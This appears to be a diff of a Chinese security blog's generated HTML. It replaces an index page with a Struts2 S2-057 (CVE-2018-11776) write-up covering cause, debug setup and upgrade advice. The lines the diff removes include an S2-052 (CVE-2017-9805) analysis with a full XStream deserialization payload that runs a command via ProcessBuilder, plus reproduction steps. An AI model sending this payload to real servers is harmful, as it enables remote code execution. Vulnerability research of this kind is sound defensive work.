@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="Struts2,">
 
 
 
@@ -79,13 +79,26 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="web security">
-<meta property="og:url" content="https://apt-zhou.github.io/index.html">
+<meta name="description" content="前言2018年8月23日，Apache Strust2发布最新安全公告，Apache Struts2 存在远程代码执行的高危漏洞，该漏洞由Semmle Security Research team的安全研究员汇报，漏洞编号为CVE-2018-11776（S2-057）影响版本：Struts 2.0.4-2.3.34, Struts 2.5.0-2.5.16 漏洞原因官方对这次漏洞的描述是：1.定义">
+<meta name="keywords" content="Struts2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Struts2 S2-057漏洞环境搭建及漏洞分析">
+<meta property="og:url" content="https://apt-zhou.github.io/2019/07/21/Struts2 S2-057漏洞环境搭建及漏洞分析/index.html">
 <meta property="og:site_name" content="web security">
+<meta property="og:description" content="前言2018年8月23日，Apache Strust2发布最新安全公告，Apache Struts2 存在远程代码执行的高危漏洞，该漏洞由Semmle Security Research team的安全研究员汇报，漏洞编号为CVE-2018-11776（S2-057）影响版本：Struts 2.0.4-2.3.34, Struts 2.5.0-2.5.16 漏洞原因官方对这次漏洞的描述是：1.定义">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="https://apt-zhou.github.io/images/2019/07/EB952A16-B35B-4AEE-86FA-15AAF3E552E0.png">
+<meta property="og:image" content="https://apt-zhou.github.io/images/2019/07/971D4C37-71C9-4E7A-8AE0-CB24B6683ECF.png">
+<meta property="og:image" content="https://apt-zhou.github.io/images/2019/07/2C81F53D-C030-4A1E-8325-688610B7D30F.png">
+<meta property="og:image" content="https://apt-zhou.github.io/images/2019/07/4658EE59-C75A-47CC-ADF1-044AE9772FFB.png">
+<meta property="og:image" content="https://apt-zhou.github.io/images/2019/07/15368C2A-9B5F-470E-99F9-62E53787D39E.png">
+<meta property="og:image" content="https://apt-zhou.github.io/images/2019/07/EAE89D97-058B-4CA2-9651-B892A19B7E39.png">
+<meta property="og:image" content="https://apt-zhou.github.io/images/2019/07/4078EEA9-31CE-47E6-B1AF-2F54B6518F80.png">
+<meta property="og:updated_time" content="2019-07-21T08:54:03.561Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="web security">
+<meta name="twitter:title" content="Struts2 S2-057漏洞环境搭建及漏洞分析">
+<meta name="twitter:description" content="前言2018年8月23日，Apache Strust2发布最新安全公告，Apache Struts2 存在远程代码执行的高危漏洞，该漏洞由Semmle Security Research team的安全研究员汇报，漏洞编号为CVE-2018-11776（S2-057）影响版本：Struts 2.0.4-2.3.34, Struts 2.5.0-2.5.16 漏洞原因官方对这次漏洞的描述是：1.定义">
+<meta name="twitter:image" content="https://apt-zhou.github.io/images/2019/07/EB952A16-B35B-4AEE-86FA-15AAF3E552E0.png">
 
 
 
@@ -115,13 +128,13 @@
 
 
 
-  <link rel="canonical" href="https://apt-zhou.github.io/">
+  <link rel="canonical" href="https://apt-zhou.github.io/2019/07/21/Struts2 S2-057漏洞环境搭建及漏洞分析/">
 
 
 
 
 
-  <title>web security</title>
+  <title>Struts2 S2-057漏洞环境搭建及漏洞分析 | web security</title>
   
 
 
@@ -140,8 +153,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -214,9 +226,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -246,9 +258,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/21/Struts2 S2-057漏洞环境搭建及漏洞分析/" itemprop="url">Struts2 S2-057漏洞环境搭建及漏洞分析</a></h1>
+          <h1 class="post-title" itemprop="name headline">Struts2 S2-057漏洞环境搭建及漏洞分析</h1>
         
 
         <div class="post-meta">
@@ -320,9 +330,7 @@
       
 
       
-        
-          
-            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>2018年8月23日，Apache Strust2发布最新安全公告，Apache Struts2 存在远程代码执行的高危漏洞，该漏洞由Semmle Security Research team的安全研究员汇报，漏洞编号为CVE-2018-11776（S2-057）<br>影响版本：Struts 2.0.4-2.3.34, Struts 2.5.0-2.5.16</p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>2018年8月23日，Apache Strust2发布最新安全公告，Apache Struts2 存在远程代码执行的高危漏洞，该漏洞由Semmle Security Research team的安全研究员汇报，漏洞编号为CVE-2018-11776（S2-057）<br>影响版本：Struts 2.0.4-2.3.34, Struts 2.5.0-2.5.16</p>
 <h1 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a><strong>漏洞原因</strong></h1><p>官方对这次漏洞的描述是：<br>1.定义XML配置时如果namespace值未设置且上层动作配置（Action Configuration）中未设置或用通配符namespace时可能会导致远程代码执行。<br>2.url标签未设置value和action值且上层动作未设置或用通配符namespace时可能会导致远程代码执行。<br>具体分析可参考：<br><a href="https://www.freebuf.com/vuls/182006.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/182006.html</a></p>
 <h1 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a><strong>调试环境搭建</strong></h1><p>1）下载官方源码：<br>git clone <a href="https://github.com/apache/Struts.git" target="_blank" rel="noopener">https://github.com/apache/Struts.git</a><br>2）切换到2.5.12分支：<br>git checkout STRUTS_2_5_10<br>3) 把源码包中src/apps/showcase整个文件夹拷贝出来，新建一个项目<br>4）用IDEA或者eclipse导入该maven项目<br>5）修改src/main/resoureces中的配置文件struts-actionchaining.xml，改成：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE struts PUBLIC</span><br><span class="line">	&quot;-//Apache Software Foundation//DTD Struts Configuration 2.5//EN&quot;</span><br><span class="line">	&quot;http://struts.apache.org/dtds/struts-2.5.dtd&quot;&gt;</span><br><span class="line">	</span><br><span class="line">&lt;struts&gt;</span><br><span class="line">    &lt;package name=&quot;actionchaining&quot; extends=&quot;struts-default&quot;&gt;</span><br><span class="line">        &lt;action name=&quot;actionChain1&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain1&quot;&gt;</span><br><span class="line">            &lt;result type=&quot;redirectAction&quot;&gt;</span><br><span class="line">                &lt;param name = &quot;actionName&quot;&gt;register2&lt;/param&gt;</span><br><span class="line">            &lt;/result&gt;</span><br><span class="line">        &lt;/action&gt;</span><br><span class="line">    &lt;/package&gt;</span><br><span class="line">&lt;/struts&gt;</span><br></pre></td></tr></table></figure>
@@ -333,8 +341,6 @@
 <h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a><strong>防御</strong></h1><p>将框架版本升级到官方最新版本；</p>
 <h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a><strong>exp</strong></h1><p>相关的exp可参考：<a href="https://github.com/Ivan1ee" target="_blank" rel="noopener">https://github.com/Ivan1ee</a></p>
 
-          
-        
       
     </div>
     
@@ -349,165 +355,36 @@
 
     <footer class="post-footer">
       
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://apt-zhou.github.io/2019/07/17/Struts2-052漏洞分析/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="fightzhong">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="web security">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/17/Struts2-052漏洞分析/" itemprop="url">Struts 2 漏洞系列之 S2-052</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-17T19:53:11+08:00">
-                2019-07-17
-              </time>
-            
-
-            
-
-            
-          </span>
-
+        <div class="post-tags">
           
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/漏洞研究/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞研究</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
+            <a href="/tags/Struts2/" rel="tag"># Struts2</a>
           
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>2017 年 9 月 5 日，由国外安全研究组织 lgtm.com 的安全研究人员发现的严重漏洞在Apache Struts 2官方发布，漏洞编号为 CVE-2017-9805（S2-052）, 攻击者可以传入精心构造的xml数据，远程命令执行。<br>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，存在安全隐患，可被远程命令执行。<br>利用条件：使用 REST 插件并在受影响版本范围内。<br>利用方式：攻击者构建恶意数据包远程利用。<br>影响版本：Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12</p>
-<h1 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a><strong>调试环境搭建</strong></h1><p>1）下载官方源码：<br>git clone <a href="https://github.com/apache/Struts.git" target="_blank" rel="noopener">https://github.com/apache/Struts.git</a><br>2）切换到2.5.12分支：<br>git checkout STRUTS_2_5_12<br>3) 把源码包中src/apps/rest-showcase整个文件夹拷贝出来，新建一个项目<br>4）用IDEA或者eclipse导入该maven项目<br>5) debug模式运行后就可以愉快的调试了<br><img src="https://apt-zhou.github.io/images/2019/07/2B51518F-4BA4-45F0-8DB2-00CA371BD745.png" alt="8da50717f7898bf33eaefe302295f2e5"></p>
-<h1 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a><strong>漏洞原理分析</strong></h1><p>根据官方公告知道该漏洞出现在 XstreamHandler 类，在 struts2-rest-plugin-2.5.12.jar 包内。<br>于是查看该类，该类中有一个toObject方法，其作用就是对xml内容进行反序列化。<br><img src="https://apt-zhou.github.io/images/2019/07/B70890FC-0A25-4BE4-BFFF-3DE6D6EED67A.png" alt="5ead76f4153cb13d1164e9d79057621f"><br>先在此方法内打一个断点，然后构造数据包<br><img src="https://apt-zhou.github.io/images/2019/07/6A81BE3B-4208-40FD-880D-20EBF9B38CC0.png" alt="f4315825608415d2685701d110423738"><br>发送数据包后，会跳到断点处，此时，看到是上层调用栈中是ContentTypeInterceptor调用了该方法<br><img src="https://apt-zhou.github.io/images/2019/07/1395EE58-9C66-415A-98A3-453B28F1A32F.png" alt="72f30224353229ed31925e051e6b8da7"><br>ContentTypeInterceptor类中intercept方法会根据传入的Content-Type的值生成相应的对象，由于我们传入的是application/xml，所以对应生成一个xml的处理对象XStreamHandler。<br>继续f5，看到执行反序列化的函数unmarshal，在这个函数执行时没有进行数据安全检查，导致远程命令执行。<br><img src="https://apt-zhou.github.io/images/2019/07/95FC3645-CA75-4311-97CB-3B33B1386B95.png" alt="227328a30b2e1c73bbdafbf4e1018ac5"><br>接着进入unmarshal函数内，继续往下调试，AbstractReflectionConverter会一步步解析我们提交的xml标签和值，最终调用poc中代码<br><img src="https://apt-zhou.github.io/images/2019/07/5DC74FC4-6116-4255-9294-5B32203720A1.png" alt="e767f1e69d9c34b9f79d2437cec288d6"></p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h1><p>在页面<a href="http://localhost:8080//struts2-rest-showcase/orders/3/edit中点击Submit，" target="_blank" rel="noopener">http://localhost:8080//struts2-rest-showcase/orders/3/edit中点击Submit，</a><br><img src="https://apt-zhou.github.io/images/2019/07/EA70D07D-5925-4D15-A37A-E2110B39CA59.png" alt="816b09313f7dc90d11af504edb249049"><br>拦截HTTP请求并将请求体改为POC Payload，同时将Content-Type Header改为application/xml。<br>payload为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt; </span><br><span class="line">  &lt;entry&gt; </span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt; </span><br><span class="line">      &lt;flags&gt;0&lt;/flags&gt;  </span><br><span class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; </span><br><span class="line">        &lt;dataHandler&gt; </span><br><span class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; </span><br><span class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; </span><br><span class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; </span><br><span class="line">                &lt;initialized&gt;false&lt;/initialized&gt;  </span><br><span class="line">                &lt;opmode&gt;0&lt;/opmode&gt;  </span><br><span class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; </span><br><span class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; </span><br><span class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;  </span><br><span class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; </span><br><span class="line">                      &lt;command&gt; </span><br><span class="line">                        &lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt; </span><br><span class="line">                      &lt;/command&gt;  </span><br><span class="line">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; </span><br><span class="line">                    &lt;/next&gt; </span><br><span class="line">                  &lt;/iter&gt;  </span><br><span class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; </span><br><span class="line">                    &lt;method&gt; </span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;  </span><br><span class="line">                      &lt;name&gt;start&lt;/name&gt;  </span><br><span class="line">                      &lt;parameter-types/&gt; </span><br><span class="line">                    &lt;/method&gt;  </span><br><span class="line">                    &lt;name&gt;foo&lt;/name&gt; </span><br><span class="line">                  &lt;/filter&gt;  </span><br><span class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; </span><br><span class="line">                &lt;/serviceIterator&gt;  </span><br><span class="line">                &lt;lock/&gt; </span><br><span class="line">              &lt;/cipher&gt;  </span><br><span class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;  </span><br><span class="line">              &lt;ibuffer/&gt;  </span><br><span class="line">              &lt;done&gt;false&lt;/done&gt;  </span><br><span class="line">              &lt;ostart&gt;0&lt;/ostart&gt;  </span><br><span class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;  </span><br><span class="line">              &lt;closed&gt;false&lt;/closed&gt; </span><br><span class="line">            &lt;/is&gt;  </span><br><span class="line">            &lt;consumed&gt;false&lt;/consumed&gt; </span><br><span class="line">          &lt;/dataSource&gt;  </span><br><span class="line">          &lt;transferFlavors/&gt; </span><br><span class="line">        &lt;/dataHandler&gt;  </span><br><span class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt; </span><br><span class="line">      &lt;/value&gt; </span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;  </span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; </span><br><span class="line">  &lt;/entry&gt;  </span><br><span class="line">  &lt;entry&gt; </span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;  </span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; </span><br><span class="line">  &lt;/entry&gt; </span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>
-
-<p>发送请求后，弹出计算器<br><img src="https://apt-zhou.github.io/images/2019/07/0E9DCB89-68EE-4A06-A636-33163FFC67BF.png" alt="3810b8ae21a2fafa7e2e1944d8a046ef"></p>
-<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a><strong>补丁</strong></h1><p>官方补丁，官方的修复方案中, 主要就是将 xml 中的数据白名单化，把 Collection 和 Map，一些基础类，时间类放在白名单中，这样就能阻止 XStream 反序列化的过程中带入一些有害类<img src="https://apt-zhou.github.io/images/2019/07/C585B43E-FEE5-426A-B64C-7540C2F38D53.png" alt="416a87182134cfa3f029ac2fe3e64a60.png"></p>
-<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a><strong>修复建议</strong></h1><p>Version 2.3.0 to 2.3.33升级到Struts 2.3.34版本<br>Version 2.5.0 to 2.5.12升级到Struts 2.5.13版本</p>
-<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h4><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-052" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-052</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
       
 
       
       
-        <div class="post-eof"></div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/17/Struts2-052漏洞分析/" rel="next" title="Struts 2 漏洞系列之 S2-052">
+                <i class="fa fa-chevron-left"></i> Struts 2 漏洞系列之 S2-052
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
       
     </footer>
   </div>
@@ -517,10 +394,11 @@
   </article>
 
 
-    
-  </section>
 
-  
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -528,6 +406,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -548,8 +430,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -609,6 +500,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞原因"><span class="nav-number">2.</span> <span class="nav-text">漏洞原因</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#调试环境搭建"><span class="nav-number">3.</span> <span class="nav-text">调试环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞分析"><span class="nav-number">4.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#防御"><span class="nav-number">5.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#exp"><span class="nav-number">6.</span> <span class="nav-text">exp</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -749,6 +656,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
